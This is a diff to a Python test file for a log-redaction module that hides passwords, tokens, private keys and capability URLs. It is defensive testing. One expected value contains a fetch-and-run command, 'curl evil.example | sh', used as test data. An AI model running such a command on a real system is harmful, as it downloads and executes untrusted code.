@@ -2,11 +2,13 @@
 
 from __future__ import annotations
 
+import hashlib
 import json
 import random
 import re
-import time
+from collections import OrderedDict
 from dataclasses import dataclass
+from types import SimpleNamespace
 from typing import TYPE_CHECKING
 from uuid import uuid4
 
@@ -14,12 +16,17 @@ import pytest
 from pydantic import BaseModel, ConfigDict
 
 from mindroom import redaction
+from mindroom.egress_broker.env import broker_execution_env
+from mindroom.egress_broker.tokens import TokenSigner, WorkerClaims
 from mindroom.redaction import (
     REDACTED,
     REDACTION_FAILED,
+    redact_config_text,
     redact_log_event,
     redact_sensitive_data,
     redact_sensitive_text,
+    redact_url_credentials,
+    truncate_review_text,
 )
 from tests.cpu_budget_helpers import cpu_budget
 
@@ -91,6 +98,78 @@ def test_redact_sensitive_data_redacts_oauth_callback_query_values_in_urls() -> 
     }
 
 
+def test_redact_sensitive_text_redacts_sharepoint_tempauth_download_urls() -> None:
+    """A pre-authenticated SharePoint download URL grants file access on its own, so its tempauth must not be logged."""
+    line = 'HTTP Request: GET https://contoso-my.sharepoint.com/personal/a/_layouts/15/download.aspx?UniqueId=1&tempauth=v1.secret "HTTP/1.1 200 OK"'
+
+    assert redact_sensitive_text(line) == (
+        "HTTP Request: GET https://contoso-my.sharepoint.com/personal/a/_layouts/15/download.aspx"
+        '?UniqueId=1&tempauth=***redacted*** "HTTP/1.1 200 OK"'
+    )
+
+
+def test_redact_sensitive_text_redacts_personal_onedrive_download_paths_in_header_dumps() -> None:
+    """A personal OneDrive download URL carries its credential in the path, also in httpcore's header logs."""
+    line = (
+        "receive_response_headers.complete return_value=(b'HTTP/1.1', 302, b'Found', "
+        "[(b'Location', b'https://public.ch.files.1drv.com/y4mCAPABILITY/report.docx?psid=1')])"
+    )
+
+    redacted = redact_sensitive_text(line)
+
+    assert "y4mCAPABILITY" not in redacted
+    assert "https://public.ch.files.1drv.com/***redacted***" in redacted
+
+
+def test_redact_sensitive_text_redacts_microsoft_graph_share_ids() -> None:
+    """A Graph share ID is the base64 of a sharing link, which may grant access to anyone holding it."""
+    line = (
+        'HTTP Request: GET https://graph.microsoft.com/v1.0/shares/u!aHR0cHM6Ly9jb250b3Nv/driveItem "HTTP/1.1 200 OK"'
+    )
+
+    assert redact_sensitive_text(line) == (
+        'HTTP Request: GET https://graph.microsoft.com/v1.0/shares/***redacted***/driveItem "HTTP/1.1 200 OK"'
+    )
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "Agent Keys adds the user's API key or connected account on the wire.",
+        "Services have neither an API key nor a connected account.",
+        "An API key wins over a connected account.",
+        "Your API keys are expiring soon: 1 API key for Acme.",
+        "Send a bearer token with each request, as bearer tokens expire.",
+        "permissions:\n  contents: read\n  id-token: write",
+        "permissions:\n  id-token: Write",
+        "permissions:\n  id-token: write  # federate the OIDC token",
+        "Never give that job `id-token: write`, since any ref could run it.",
+    ],
+)
+def test_redact_sensitive_text_keeps_prose_about_credentials(text: str) -> None:
+    """Docs and tool results that talk about API keys keep their words, as Matrix shows them in tool previews."""
+    assert redact_sensitive_text(text) == text
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("API key: hunter", f"API key: {REDACTED}"),
+        ("Invalid API key hunter", f"Invalid API key {REDACTED}"),
+        ("Authorization header Bearer hunter", f"Authorization header Bearer {REDACTED}"),
+        ("Authorization: Bearer hunter", f"Authorization: Bearer {REDACTED}"),
+        ("API key AbCdEfGhIjKlMnOp", f"API key {REDACTED}"),
+        ("Bearer abcdefghIJKLmnop", f"Bearer {REDACTED}"),
+        ("id-token: eyJhbGciOiJSUzI1NiJ9.e30.c2ln", f"id-token: {REDACTED}"),
+        ("id-token: writeAbCdEf", f"id-token: {REDACTED}"),
+        ("id_token=read eyJhbGciOiJSUzI1NiJ9.e30.c2ln", f"id_token={REDACTED}"),
+    ],
+)
+def test_redact_sensitive_text_still_hides_credentials_spelled_like_words(text: str, expected: str) -> None:
+    """A labeled value, an Authorization header, or a mixed-case run is a credential even without digits."""
+    assert redact_sensitive_text(text) == expected
+
+
 @pytest.mark.parametrize(
     "dsn",
     [
@@ -126,7 +205,37 @@ def test_url_redaction_preserves_text_before_a_credential_bearing_scheme(prefix:
     """A URL can follow digits or punctuation without losing its credential protection."""
     value = f"{prefix}{scheme}://user:hunter2@example.test/path"
 
-    assert redact_sensitive_text(value) == f"{prefix}{scheme}://user:***@example.test/path"
+    assert redact_sensitive_text(value) == f"{prefix}{scheme}://***@example.test/path"
+
+
+def test_printed_proxy_settings_hide_the_token_in_the_proxy_user_name() -> None:
+    """Worker proxies carry their token as the proxy URL user name, so printing the proxy settings must not show it."""
+    broker_token = _minted_broker_token()
+    proxy_token = _fake_token("", 32)
+    broker_env = broker_execution_env(
+        broker_url="http://broker:8768",
+        token=broker_token,
+        ca_pem="",
+        placeholder_env={},
+        extra_no_proxy_hosts=[],
+    )
+    printed = [
+        *(f"{key}={value}" for key, value in broker_env.items()),
+        f"HTTPS_PROXY=http://{proxy_token}:password@proxy:8080",
+        f"* Proxy auth using Basic with user '{broker_token}'",
+    ]
+
+    redacted = redact_sensitive_text("\n".join(printed))
+
+    assert broker_token not in redacted
+    assert proxy_token not in redacted
+    assert "HTTPS_PROXY=http://***@broker:8768" in redacted
+
+
+@pytest.mark.parametrize("name", ["mrb1.example.com", "mrb1.tar.gz", "mrb1.2.3"])
+def test_dotted_names_that_start_like_a_broker_token_stay_visible(name: str) -> None:
+    """Only the broker's real token shape is hidden, not a host, file, or version that starts with `mrb1.`."""
+    assert redact_sensitive_text(f"fetch {name} now") == f"fetch {name} now"
 
 
 @pytest.mark.parametrize("run", ["x" * 64_000, "9x" * 32_000], ids=["letters", "mixed"])
@@ -580,11 +689,26 @@ def test_redact_sensitive_text_fails_closed_on_oversized_unbounded_input() -> No
     assert redact_sensitive_text(value) == REDACTION_FAILED
 
 
-def test_redact_sensitive_text_fails_closed_on_ambiguous_multiline_secret() -> None:
-    """Multiline assignment syntax is ambiguous, so suppress it instead of guessing a span."""
-    value = "password=\n  hunter2\nmode=safe"
-
-    assert redact_sensitive_text(value) == REDACTION_FAILED
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("password=\n  hunter2\nmode=safe", f"password=\n  {REDACTED}"),
+        ("db:\n  password:\r\n    hunter2\n  host: db.example", f"db:\n  password:\r\n    {REDACTED}"),
+        ("if not api_key:\n    raise SystemExit(1)\nrun()", f"if not api_key:\n    {REDACTED}"),
+        ("token:", "token:"),
+        ("token:\n  \n", "token:\n  \n"),
+        ('expect "Password:"\nsend "hunter2\\r"', f'expect "Password:"\n{REDACTED}'),
+        (
+            "permissions:\n  id-token:\n    write # OIDC\nenv:\n  password=hunter2",
+            f"permissions:\n  id-token:\n    write # OIDC\nenv:\n  password={REDACTED}",
+        ),
+    ],
+)
+def test_a_secret_name_that_ends_its_line_hides_the_rest_of_the_text(text: str, expected: str) -> None:
+    """A value can sit on any line after its key, as in YAML or a following message; the text before it stays readable."""
+    assert redact_sensitive_text(text) == expected
+    # Previews are redacted again where they are shown, so a redacted text must come back unchanged.
+    assert redact_sensitive_text(expected) == expected
 
 
 def test_redact_sensitive_data_uses_context_for_bare_values_in_secret_lists() -> None:
@@ -673,17 +797,19 @@ def test_redact_sensitive_data_keeps_values_for_non_schema_label_keys() -> None:
 def test_redact_sensitive_text_rejects_oversized_unbounded_runs_quickly() -> None:
     """Hard input budget must reject oversized text without scanning its contents."""
     blob = "Ab3" * 40_000
-    start = time.perf_counter()
-    assert redact_sensitive_text(blob) == REDACTION_FAILED
-    assert time.perf_counter() - start < 5.0
+    with cpu_budget(5.0):
+        redacted = redact_sensitive_text(blob)
+
+    assert redacted == REDACTION_FAILED
 
 
 def test_redact_sensitive_text_stays_linear_while_finding_value_terminator() -> None:
     """Assignment lookahead must not repeatedly rescan long whitespace and key-like runs."""
     value = "password=visible" + " " * 12_000 + "Ab3" * 4_000
-    start = time.perf_counter()
-    assert redact_sensitive_text(value) == f"password={REDACTED}"
-    assert time.perf_counter() - start < 5.0
+    with cpu_budget(5.0):
+        redacted = redact_sensitive_text(value)
+
+    assert redacted == f"password={REDACTED}"
 
 
 @pytest.mark.parametrize(
@@ -716,6 +842,11 @@ def test_redact_sensitive_text_redacts_quoted_secret_with_escaped_quote() -> Non
     assert redact_sensitive_text(value) == r'{"password": "***redacted***", "mode": "safe"}'
 
 
+def test_an_assignment_inside_a_secret_value_is_hidden_with_it() -> None:
+    """The scan resumes after a secret's value, so a key inside the value is hidden with it rather than read again."""
+    assert redact_sensitive_text('password="token=abc def" mode=safe') == f'password="{REDACTED}" mode=safe'
+
+
 def test_redact_sensitive_text_redacts_secret_assignments_with_long_keys() -> None:
     """Performance guards must not exempt long secret-bearing keys from redaction."""
     key = "x" * 256 + "password"
@@ -737,6 +868,317 @@ def test_redact_sensitive_text_still_redacts_assignments_at_run_boundaries() -> 
     assert "hunter2" not in redacted
     assert "abc" not in redacted
     assert "api_key" in redacted
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ('grep -rn "password=" .', f'grep -rn "password=" {REDACTED}'),
+        ("rg 'api_key:' src", f"rg 'api_key:' {REDACTED}"),
+        ('read -rsp "Password: " pw && echo done', f'read -rsp "Password: " {REDACTED} && echo done'),
+        ('grep -rn "token=" src | grep -v test', f'grep -rn "token=" {REDACTED} | grep -v test'),
+        ('grep -rn "password=" "src/" | grep "x"', f'grep -rn "password=" {REDACTED} | grep "x"'),
+        ("echo \"password:\" 'hun'ter2", f'echo "password:" {REDACTED}'),
+        ('echo "password:" hunter2 > config.yaml', f'echo "password:" {REDACTED} > config.yaml'),
+        ('echo "password:" hunter2>config.yaml', f'echo "password:" {REDACTED}>config.yaml'),
+        ('echo "password:" correct horse battery > config.yaml', f'echo "password:" {REDACTED} > config.yaml'),
+        ('At the "Password:" prompt, enter hunter2', f'At the "Password:" {REDACTED}'),
+        ('echo "password:" \\\n  hunter2 > config.yaml', f'echo "password:" \\\n  {REDACTED} > config.yaml'),
+        ('grep -rn "password="; echo done', 'grep -rn "password="; echo done'),
+    ],
+)
+def test_a_quoted_secret_name_hides_the_value_that_may_follow_it(command: str, expected: str) -> None:
+    """A word attached to the quote that ends the name's string, or the arguments after a space, may be the value."""
+    assert redact_sensitive_text(command) == expected
+    # Previews are redacted again where they are shown, so a redacted text must come back unchanged.
+    assert redact_sensitive_text(expected) == expected
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ('password="correct horse battery', f'password="{REDACTED}'),
+        ('{"password": "hunter2', f'{{"password": "{REDACTED}'),
+        ('password="hunter2\nmode=safe', f'password="{REDACTED}'),
+        ('password: "\n  hunter2"\nmode=safe', f'password: "\n  {REDACTED}'),
+        ('curl -d "password="hunter2 https://example.test', f'curl -d "password="{REDACTED} https://example.test'),
+        ("echo 'TOKEN='\"abc 123\" > .env", f"echo 'TOKEN='{REDACTED} > .env"),
+    ],
+)
+def test_an_unclosed_quoted_secret_hides_the_rest_of_the_text(text: str, expected: str) -> None:
+    """A quoted value left unclosed can continue on later lines, so the rest is hidden instead of the whole text failing."""
+    assert redact_sensitive_text(text) == expected
+    # Previews are redacted again where they are shown, so a redacted text must come back unchanged.
+    assert redact_sensitive_text(expected) == expected
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("API_KEY=abc && run", f"API_KEY={REDACTED} && run"),
+        ("export api_key=abc && run", f"export api_key={REDACTED} && run"),
+        ("TOKEN=abc , next", f"TOKEN={REDACTED} , next"),
+        ("export DB_PASSWORD=hunter2 \\\n  DB_HOST=db", f"export DB_PASSWORD={REDACTED}\n  DB_HOST=db"),
+        ("export DB_PASSWORD=hunter2 \\\r\n  DB_HOST=db", f"export DB_PASSWORD={REDACTED}\r\n  DB_HOST=db"),
+        (
+            "docker run -d \\\n  -e POSTGRES_PASSWORD=hunter2 \\\n  -p 5432:5432 postgres:16",
+            f"docker run -d \\\n  -e POSTGRES_PASSWORD={REDACTED}\n  -p 5432:5432 postgres:16",
+        ),
+    ],
+)
+def test_an_unquoted_value_leaves_the_whitespace_before_its_end(command: str, expected: str) -> None:
+    """The space before the operator or punctuation that ends an unquoted value stays, so the command stays readable."""
+    assert redact_sensitive_text(command) == expected
+    # Previews are redacted again where they are shown, so a redacted text must come back unchanged.
+    assert redact_sensitive_text(expected) == expected
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("password: correct horse battery staple", f"password: {REDACTED}"),
+        ("password = correct horse battery staple", f"password = {REDACTED}"),
+        ("Proxy-Authorization: Basic dXNlcjpwdw==", f"Proxy-Authorization: {REDACTED}"),
+        ("AUTHORIZATION: Basic dXNlcjpwdw==", f"AUTHORIZATION: {REDACTED}"),
+        ("HOME=/root\nPASSWORD=correct horse battery staple", f"HOME=/root\nPASSWORD={REDACTED}"),
+        ("AUTHORIZATION=Basic dXNlcjpwdw==", f"AUTHORIZATION={REDACTED}"),
+        ('"Env": ["DB_PASSWORD=correct horse battery"]', f'"Env": ["DB_PASSWORD={REDACTED}"]'),
+        ('psql "host=db password=correct horse"', f'psql "host=db password={REDACTED}"'),
+        ("12:AUTHORIZATION=Basic dXNlcjpwdw==", f"12:AUTHORIZATION={REDACTED}"),
+        ('export "DB_PASSWORD=correct horse"', f'export "DB_PASSWORD={REDACTED}"'),
+        ("     1\tDB_PASSWORD=correct horse battery", f"     1\tDB_PASSWORD={REDACTED}"),
+        ("2026-11-08T12:00:00Z PASSWORD=correct horse battery", f"2026-11-08T12:00:00Z PASSWORD={REDACTED}"),
+    ],
+)
+def test_a_value_outside_a_shell_assignment_hides_every_word(text: str, expected: str) -> None:
+    """Config files, headers, `env` output, and prose put spaces inside values, so their values still run to the end."""
+    assert redact_sensitive_text(text) == expected
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("curl -u admin:pw https://example.test/x", f"curl -u admin:{REDACTED} https://example.test/x"),
+        ("curl -sS --user=admin:pw https://example.test/x", f"curl -sS --user=admin:{REDACTED} https://example.test/x"),
+        ('curl -u "admin:my pw" https://example.test/x', f'curl -u "admin:{REDACTED}" https://example.test/x'),
+        ('curl -u "admin:"hunter2 https://example.test/x', f'curl -u "admin:{REDACTED}" https://example.test/x'),
+        ("curl -uadmin:pw https://example.test/x", f"curl -uadmin:{REDACTED} https://example.test/x"),
+        ("mysql -u root -p'pw' app", f"mysql -u root -p{REDACTED} app"),
+        ("mysql -uroot -ppw app", f"mysql -uroot -p{REDACTED} app"),
+        ('mysqldump -p"my pw" app > dump.sql', f"mysqldump -p{REDACTED} app > dump.sql"),
+        ("/usr/bin/mariadb -u root \\\n  -ppw app", f"/usr/bin/mariadb -u root \\\n  -p{REDACTED} app"),
+        ('mysql -e "select \\\r\n 1" -ppw app', f'mysql -e "select \\\r\n 1" -p{REDACTED} app'),
+        ("sudo mysql -ppw app", f"sudo mysql -p{REDACTED} app"),
+        ("curl -u \\\n  'admin:pw' https://example.test/x", f"curl -u \\\n  'admin:{REDACTED}' https://example.test/x"),
+        ("curl -u 7f3a9c1e2b4d6f8a0c2e: https://example.test/api", f"curl -u {REDACTED}: https://example.test/api"),
+        ('curl -u "7f3a9c1e2b4d6f8a0c2e:" https://example.test/api', f'curl -u "{REDACTED}:" https://example.test/api'),
+        ("sudo \\\n  mysql -ppw app", f"sudo \\\n  mysql -p{REDACTED} app"),
+        ("mysql -p'first'\"second\" app", f"mysql -p{REDACTED} app"),
+        ('curl -u admin:"my pw" https://example.test/x', f"curl -u admin:{REDACTED} https://example.test/x"),
+        ('while read db; do mysql -ppw "$db"; done', f'while read db; do mysql -p{REDACTED} "$db"; done'),
+        (
+            "if true; then curl -u admin:pw https://example.test/x; fi",
+            f"if true; then curl -u admin:{REDACTED} https://example.test/x; fi",
+        ),
+        ("curl -u 'admin:p\"ssw0rd' https://example.test/x", f"curl -u 'admin:{REDACTED}' https://example.test/x"),
+        ('curl -u "admin:ab\\"cd" https://example.test/x', f'curl -u "admin:{REDACTED}" https://example.test/x'),
+        ("curl -u admin:my\\ pw https://example.test/x", f"curl -u admin:{REDACTED} https://example.test/x"),
+        ("curl -u admin:pw\\\n  https://example.test/x", f"curl -u admin:{REDACTED}\\\n  https://example.test/x"),
+        ('mysql -p"ab\\"cd" app', f"mysql -p{REDACTED} app"),
+        ("mysql -ppassword: hunter2", f"mysql -p{REDACTED} {REDACTED}"),
+        ("mysql -u root -p'ab&c;d|e' app", f"mysql -u root -p{REDACTED} app"),
+        ('mysql -e "select 1; select 2" -ppw app', f'mysql -e "select 1; select 2" -p{REDACTED} app'),
+        ("time mysql -uroot -ppw app", f"time mysql -uroot -p{REDACTED} app"),
+        (
+            "cd /srv && curl -u admin:pw https://example.test/x",
+            f"cd /srv && curl -u admin:{REDACTED} https://example.test/x",
+        ),
+    ],
+)
+def test_a_password_given_as_a_command_option_is_hidden(command: str, expected: str) -> None:
+    """Curl takes `user:password` after `-u`, and mysql takes a password attached to `-p`."""
+    assert redact_sensitive_text(command) == expected
+    # Previews are redacted again where they are shown, so a redacted text must come back unchanged.
+    assert redact_sensitive_text(expected) == expected
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "mkdir -pv build && cp -pr src build",
+        "docker run -p8080:80 -u 1000 app",
+        "ssh -p2222 host",
+        "git push -u origin main",
+        "docker run --user 1000:0 alpine id",
+        "curl --user-agent=Mozilla:5.0 https://example.test/x",
+        "curl -u admin https://example.test/x",
+        "curl --negotiate -u : https://example.test/x",
+        "date -u +%H:%M:%S",
+        "rsync -u host:/srv/data ./data",
+        "docker run --name mysql -p3306:3306 -d mysql:8",
+        "find /var/lib/mysql -perm 644 -print",
+        "cc app.c $(mysql_config --libs) -pthread",
+        "sudo find /var/lib/mysql -perm 644 -print",
+        "sudo -u mysql cp -pr src dst",
+        "which curl && git push -u origin main:main",
+        "mysql -u root -p app && mkdir -pv backup",
+    ],
+)
+def test_options_that_carry_no_password_stay(command: str) -> None:
+    """Outside mysql, an attached `-p` starts other options, and a bare `-p` makes mysql prompt."""
+    assert redact_sensitive_text(command) == command
+
+
+def test_a_quoted_value_continued_after_a_backslash_line_break_ends_at_its_quote() -> None:
+    """The command after a quoted value that a backslash line break continues stays readable."""
+    assert redact_sensitive_text('TOKEN="abcdef\\\nghijkl" make') == f'TOKEN="{REDACTED}" make'
+
+
+@pytest.mark.parametrize(
+    "unit",
+    [
+        'grep "token=" .\n',
+        "token:\n",
+        "export TOKEN=a ",
+        "mysql -p",
+        "curl -u a:b;",
+        'password="\n',
+        "curl -u a:b \\\n",
+        "id_token: write #",
+        "id-token:\n  write # x\n",
+    ],
+    ids=[
+        "closing-quotes",
+        "line-ends",
+        "assignments",
+        "mysql",
+        "curl",
+        "unclosed-quotes",
+        "continued-commands",
+        "permissions",
+        "line-ending-permissions",
+    ],
+)
+def test_redaction_stays_linear_over_many_command_patterns(unit: str) -> None:
+    """Each pattern a command can repeat is read once, however often it repeats."""
+    count = 64_000 // len(unit)
+    with cpu_budget(0.25):
+        redacted = redact_sensitive_text(unit * count)
+
+    assert REDACTION_FAILED not in redacted
+
+
+def test_a_bounded_redaction_never_shows_a_url_password_its_cut_split_off() -> None:
+    """Shortening a long token before the cut must not pull a URL's password, cut off from its `@`, into view."""
+    text = "sk-" + "a" * 588 + " https://user:hunter2@host/x " + "tail " * 200
+
+    for redacted in (
+        redact_sensitive_text(text, max_length=100),
+        redact_sensitive_data({"command": text}, max_string_length=100)["command"],
+    ):
+        assert redacted == f"{REDACTED} https://***@host/x... [truncated]"
+
+
+def test_a_bounded_redaction_leaves_out_a_word_longer_than_it_reads() -> None:
+    """A word without whitespace that runs past what redaction reads is left out rather than split."""
+    text = "sk-" + "a" * 588 + ",https://user:hunter2@" + "h" * 70_000
+
+    assert redact_sensitive_text(text, max_length=100) == "... [truncated]"
+
+
+def test_a_bounded_redaction_of_long_text_shows_its_start() -> None:
+    """Text longer than redaction reads whole still shows its start when a length bound keeps the read short."""
+    assert redact_sensitive_text("word " * 20_000, max_length=30) == "word word word ... [truncated]"
+
+
+@pytest.mark.parametrize("max_length", [0, 1, 5, 14, 15, 16])
+def test_a_length_bound_shorter_than_the_truncation_marker_is_kept(max_length: int) -> None:
+    """Every length bound holds, also one too short for the whole truncation marker."""
+    marker = "... [truncated]"
+    expected = marker[:max_length] if max_length < len(marker) else "x" * (max_length - len(marker)) + marker
+    assert redact_sensitive_text("x" * 50, max_length=max_length) == expected
+    assert len(redact_sensitive_text("x" * 70_000, max_length=max_length)) <= max_length
+    assert truncate_review_text("x" * 50, max_length) == expected
+
+
+def _record_text_scans(monkeypatch: pytest.MonkeyPatch, cache_size: int) -> list[str]:
+    """Return the texts redaction scans from now on, with an empty unchanged-text cache of ``cache_size``."""
+    scanned: list[str] = []
+    scan = redaction._redact_sensitive_text
+
+    def recording_scan(value: str, *, max_length: int | None, prose: bool = False) -> str:
+        scanned.append(value)
+        return scan(value, max_length=max_length, prose=prose)
+
+    monkeypatch.setattr(redaction, "_redact_sensitive_text", recording_scan)
+    monkeypatch.setattr(redaction, "_unchanged_texts", OrderedDict())
+    monkeypatch.setattr(redaction, "_UNCHANGED_TEXT_CACHE_SIZE", cache_size)
+    return scanned
+
+
+def test_a_long_text_redaction_left_unchanged_is_not_scanned_again(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Each model call resends the conversation to the request log, so an unchanged long text is scanned only once."""
+    scanned = _record_text_scans(monkeypatch, cache_size=8)
+    prose = "A long paragraph of ordinary words that holds no credential at all. " * 5
+    secret = f"export PASSWORD=hunter2\n{prose}"
+
+    first = redact_sensitive_data({"messages": [{"content": prose}, {"content": secret}]})
+
+    assert redact_sensitive_data({"messages": [{"content": prose}, {"content": secret}]}) == first
+    assert first == {"messages": [{"content": prose}, {"content": f"export PASSWORD={REDACTED}\n{prose}"}]}
+    assert scanned == [prose, secret, secret]
+    # What was left unchanged holds only for the length bound and the mode it was scanned with.
+    assert redact_sensitive_text(prose, max_length=40).endswith("... [truncated]")
+    beyond_bounded_scan = prose * 200
+    assert redact_sensitive_data(beyond_bounded_scan) == beyond_bounded_scan
+    assert redact_sensitive_data(beyond_bounded_scan, max_string_length=100_000).endswith("... [truncated]")
+    kebab_name = f"{prose}Install sk-learn first."
+    assert redact_config_text(kebab_name) == kebab_name
+    assert redact_sensitive_text(kebab_name) == f"{prose}Install {REDACTED} first."
+
+
+def test_a_str_subclass_never_marks_a_text_unchanged(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A text type that redefines comparison cannot vouch for a text redaction changes."""
+    monkeypatch.setattr(redaction, "_unchanged_texts", OrderedDict())
+
+    class EqualToAnything(str):
+        __slots__ = ()
+        __hash__ = str.__hash__
+
+        def __eq__(self, _other: object) -> bool:
+            return True
+
+    text = "ordinary words, nothing secret. " * 10 + "password=hunter2"
+    redact_sensitive_data(EqualToAnything(text))
+
+    assert "hunter2" not in str(redact_sensitive_data(text))
+
+
+def test_a_text_over_its_length_bound_is_not_hashed(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A text cut to its bound never comes back unchanged, so redaction reads only the start of it."""
+    hashed: list[int] = []
+
+    def recording_sha256(data: bytes) -> object:
+        hashed.append(len(data))
+        return hashlib.sha256(data)
+
+    monkeypatch.setattr(redaction, "hashlib", SimpleNamespace(sha256=recording_sha256))
+    text = "ordinary words, nothing secret. " * 1000
+
+    assert redact_sensitive_text(text, max_length=2048).endswith("... [truncated]")
+    assert redact_sensitive_text(text[:2000], max_length=2048) == text[:2000]
+    assert hashed == [2000]
+
+
+def test_the_unchanged_text_cache_keeps_the_latest_texts(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A full cache forgets the text least recently seen, so a text seen again stays."""
+    scanned = _record_text_scans(monkeypatch, cache_size=2)
+    first, second, third = (f"{name} " + "ordinary words, nothing secret. " * 10 for name in ("one", "two", "three"))
+
+    for text in (first, second, first, third, first, second):
+        assert redact_sensitive_text(text) == text
+
+    assert scanned == [first, second, third, second]
 
 
 def _count_key_normalizations(monkeypatch: pytest.MonkeyPatch) -> Callable[[], int]:
@@ -1030,6 +1472,20 @@ def _fake_token(prefix: str, length: int) -> str:
     return prefix + "".join(("A", "b", "3", "Z")[index % 4] for index in range(length))
 
 
+def _minted_broker_token() -> str:
+    claims = WorkerClaims(
+        worker_key="worker-alice-code",
+        worker_scope="user_agent",
+        routing_agent_name="code",
+        tenant_id=None,
+        account_id=None,
+        channel="matrix",
+        agent_name="code",
+        requester_id="@alice:example.org",
+    )
+    return TokenSigner(b"k" * 32).mint(claims, now=0)
+
+
 def _fake_jwt() -> str:
     return ".".join([_fake_token("eyJ", 12), _fake_token("eyJ", 16), _fake_token("s", 10)])
 
@@ -1069,6 +1525,7 @@ def test_review_copy_numbers_each_distinct_token() -> None:
         _fake_token("github_pat_", 40),
         _fake_token("AIza", 35),
         _fake_jwt(),
+        _minted_broker_token(),
     ],
 )
 def test_review_copy_hides_known_token_formats(token: str) -> None:
@@ -1141,7 +1598,6 @@ def test_review_copy_treats_keys_like_text() -> None:
     redacted, placeholders = _review_copy({"⟦secret-1⟧": 1, token: 2})
 
     # The escaped key still names a secret, so its value is hidden like any secret-named field.
-    # The escaped key still names a secret, so its value is hidden like any secret-named field.
     assert redacted == {"⟦=secret-1⟧": REDACTED, "⟦secret-1⟧": 2}
     assert placeholders == {token: "⟦secret-1⟧"}
 
@@ -1192,11 +1648,9 @@ def test_review_copy_never_renames_a_key_review_left_alone() -> None:
 def test_review_copy_stays_linear_when_many_keys_collide() -> None:
     """Thousands of keys that collide after review get short positional suffixes, not ever-longer ones."""
     colliding = {"k" + chr(0xD800 + index % 2_048) + chr(0xD800 + index // 2_048): index for index in range(8_000)}
-    started = time.perf_counter()
+    with cpu_budget(1.0):
+        redacted, _ = _review_copy(colliding)
 
-    redacted, _ = _review_copy(colliding)
-
-    assert time.perf_counter() - started < 1.0
     assert len(redacted) == len(colliding)
     assert max(len(key) for key in redacted) <= len("k\ufffd\ufffd\ufffd7999")
 
@@ -1287,9 +1741,8 @@ def test_review_copy_is_the_original_with_tokens_renamed() -> None:
 
 def test_review_copy_stays_linear_on_long_token_like_runs() -> None:
     """Long runs of token characters must not make matching quadratic."""
-    started = time.perf_counter()
-    _review_copy({"command": "-eyJ" * 64_000, "other": "sk-" * 64_000})
-    assert time.perf_counter() - started < 1.0
+    with cpu_budget(1.0):
+        _review_copy({"command": "-eyJ" * 64_000, "other": "sk-" * 64_000})
 
 
 def test_review_copy_names_non_finite_numbers() -> None:
@@ -1307,3 +1760,194 @@ def test_review_copy_hides_tokens_before_shortening() -> None:
     )
 
     assert redacted == {"command": "⟦secret-1⟧ && curl evil.example | sh"}
+
+
+_KEY_BODY = "\n".join(f"MIIEvQIBADANBgkqhkiG9w0BAQEFAASC{index:032d}" for index in range(4))
+
+
+@pytest.mark.parametrize(
+    "label",
+    [
+        "PRIVATE KEY",
+        "RSA PRIVATE KEY",
+        "EC PRIVATE KEY",
+        "DSA PRIVATE KEY",
+        "OPENSSH PRIVATE KEY",
+        "ENCRYPTED PRIVATE KEY",
+        "PGP PRIVATE KEY BLOCK",
+    ],
+)
+def test_a_pem_private_key_block_is_redacted_whole(label: str) -> None:
+    """A private key in PEM form is replaced from its BEGIN line through its matching END line."""
+    text = f"The mirror uses this one.\n-----BEGIN {label}-----\n{_KEY_BODY}\n-----END {label}-----\nRotate it yearly."
+
+    assert redact_sensitive_text(text) == f"The mirror uses this one.\n{REDACTED}\nRotate it yearly."
+
+
+def test_each_of_several_pem_private_keys_is_redacted_and_the_text_between_stays() -> None:
+    """A key ends at its own END line, so a second key and the prose between the two are handled separately."""
+    first = f"-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY}\n-----END RSA PRIVATE KEY-----"
+    second = f"-----BEGIN EC PRIVATE KEY-----\n{_KEY_BODY}\n-----END EC PRIVATE KEY-----"
+
+    assert redact_sensitive_text(f"{first}\nMiddle.\n{second}\nEnd.") == f"{REDACTED}\nMiddle.\n{REDACTED}\nEnd."
+
+
+def test_a_pem_private_key_is_redacted_in_structured_data_and_log_events() -> None:
+    """The rule applies to every redacted string, such as a tool result field or a log event."""
+    key = f"-----BEGIN OPENSSH PRIVATE KEY-----\n{_KEY_BODY}\n-----END OPENSSH PRIVATE KEY-----"
+
+    assert redact_sensitive_data({"result": [f"Key:\n{key}\nDone."]}) == {"result": [f"Key:\n{REDACTED}\nDone."]}
+    assert redact_log_event(None, "info", {"event": "Loaded", "output": key}) == {"event": "Loaded", "output": REDACTED}
+
+
+@pytest.mark.parametrize(
+    "ending",
+    [
+        pytest.param("\nNotes after the key.", id="no-end-line"),
+        pytest.param("\n-----END EC PRIVATE KEY-----", id="other-end"),
+    ],
+)
+def test_an_unclosed_pem_private_key_is_redacted_to_the_end(ending: str) -> None:
+    """Without its matching END line, a private key runs to the end of the text, so none of its body escapes."""
+    text = f"Before the key.\n-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY}{ending}"
+
+    assert redact_sensitive_text(text) == f"Before the key.\n{REDACTED}"
+
+
+def test_a_pem_private_key_cut_by_a_length_bound_leaves_no_body() -> None:
+    """A key whose END line falls past the bound is cut off, and the rest of it is still redacted."""
+    text = f"-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY * 100}\n-----END RSA PRIVATE KEY-----"
+
+    assert redact_sensitive_text(text, max_length=200) == f"{REDACTED}... [truncated]"
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        pytest.param(f"-----BEGIN CERTIFICATE-----\n{_KEY_BODY}\n-----END CERTIFICATE-----", id="certificate"),
+        pytest.param(f"-----BEGIN PUBLIC KEY-----\n{_KEY_BODY}\n-----END PUBLIC KEY-----", id="public-key"),
